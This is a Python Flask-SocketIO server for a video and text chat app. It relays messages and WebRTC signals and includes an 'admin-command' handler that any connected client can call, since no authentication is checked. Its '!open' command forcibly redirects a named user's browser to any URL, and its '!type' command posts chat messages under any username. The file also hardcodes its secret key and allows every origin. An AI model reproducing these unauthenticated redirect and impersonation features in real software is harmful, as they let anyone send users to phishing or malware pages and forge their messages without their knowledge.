from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit
import os
import re

app = Flask(__name__)
app.config['SECRET_KEY'] = 'video-chat-key'
socketio = SocketIO(app, cors_allowed_origins="*", logger=True, engineio_logger=True)

# Mapping of username -> session_id
user_sessions = {}

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('join')
def on_join(data):
    sid = request.sid
    username = data.get('username')
    user_sessions[username] = sid 
    data['id'] = sid 
    emit('user-joined', data, broadcast=True, include_self=False)

@socketio.on('chat-message')
def handle_message(data):
    emit('chat-message', data, broadcast=True)

# --- UPDATED ADMIN COMMAND HANDLER ---
@socketio.on('admin-command')
def handle_admin(data):
    cmd_text = data.get('command', '')
    
    # 1. !open <link> <username>
    open_match = re.search(r'!open\s+["\']?([^"\s]+)["\']?\s+(\S+)', cmd_text)
    if open_match:
        url = open_match.group(1)
        target_user = open_match.group(2)
        if target_user in user_sessions:
            target_sid = user_sessions[target_user]
            emit('force-redirect', {'url': url}, room=target_sid)
        return

    # 2. !type <string> <username>
    # Regex handles: !type "Message with spaces" username
    type_match = re.search(r'!type\s+["\']?(.+?)["\']?\s+(\S+)$', cmd_text)
    if type_match:
        fake_msg = type_match.group(1)
        fake_user = type_match.group(2)
        # Broadcast the message as the specified username
        emit('chat-message', {'username': fake_user, 'msg': fake_msg}, broadcast=True)

@socketio.on('signal')
def on_signal(data):
    recipient_sid = data.get('to')
    emit('signal', data, room=recipient_sid)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
